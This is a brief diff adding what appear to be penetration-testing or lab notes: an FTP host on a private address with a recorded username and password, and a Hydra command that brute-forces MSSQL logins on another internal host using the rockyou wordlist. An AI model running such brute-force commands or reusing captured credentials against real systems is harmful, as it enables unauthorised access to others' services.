@@ -1,0 +1,5 @@
+FTP services 
+192.168.10.111  = user = nick / passwd = apple 
+$ hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
+
+
